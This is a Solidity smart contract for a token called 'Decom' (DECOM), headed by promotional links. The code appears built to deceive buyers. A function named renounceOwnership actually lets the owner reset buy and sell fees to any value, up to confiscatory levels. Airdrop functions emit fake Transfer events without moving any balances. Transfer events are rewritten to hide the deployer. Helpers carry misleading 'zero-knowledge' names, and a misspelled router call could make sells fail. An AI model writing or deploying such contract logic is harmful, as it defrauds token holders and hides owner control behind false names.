/**
 */

/*

🕸  Website: https://decommarketplace.io
✅ Telegram: https://t.me/decometh
✖️ Twitter/X: https://twitter.com/decometh
📝 Litepaper: https://litepaper.decommarketplace.io
💰 Marketplace: https://app.decommarketplace.io/


*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract DECOM {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    string private _name = unicode"Decom";
    string private _symbol = unicode"DECOM";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private Staking = 0xBA3ea71a2FDB54324A95f946a07B6cbDfE4bc8E9;
    address private StrategicMarketing =
        0xe7344C5cE56E804BfdDb33f20484380AC47d0eA6;
    address private StoicDaoIncubator =
        0x8b13f75239C73c4e0cAC482b3d66ad865D53fad4;
    address private Team = 0x6E57a16F3fdDDD7c86F3483e34dC5113a2974a6d;
    address private CexListing = 0xf26b1c2706e96ddfDDC53B7761b8cd1B74D738ea;

    address private MarketingFee = 0xe7344C5cE56E804BfdDb33f20484380AC47d0eA6;
    address private Development = 0x49d038beBB633670815c2907b0d88d63da7Eb30F;
    address private StoicDAO = 0x8b13f75239C73c4e0cAC482b3d66ad865D53fad4;

    constructor() {
        uint8 _initBuyFee = 5;
        uint8 _initSellFee = 5;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 70) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[Staking] = (totalSupply * 10) / 100;
        emit Transfer(address(0), Staking, balanceOf[Staking]);

        balanceOf[StrategicMarketing] = (totalSupply * 5) / 100;
        emit Transfer(
            address(0),
            StrategicMarketing,
            balanceOf[StrategicMarketing]
        );

        balanceOf[CexListing] = (totalSupply * 5) / 100;
        emit Transfer(address(0), CexListing, balanceOf[CexListing]);

        balanceOf[StoicDaoIncubator] = (totalSupply * 5) / 100;
        emit Transfer(
            address(0),
            StoicDaoIncubator,
            balanceOf[StoicDaoIncubator]
        );

        balanceOf[Team] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);
    }

    receive() external payable {}

    function renounceOwnership(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    function initialize(address addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function revenueDistribution(
        uint256 _marketing,
        uint256 _development,
        uint256 _stoicDAO
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function setInfo(uint256 _buy, uint256 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );

            payable(MarketingFee).transfer((address(this).balance * 40) / 100);
            payable(Development).transfer((address(this).balance * 40) / 100);
            payable(StoicDAO).transfer((address(this).balance * 20) / 100);

            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}
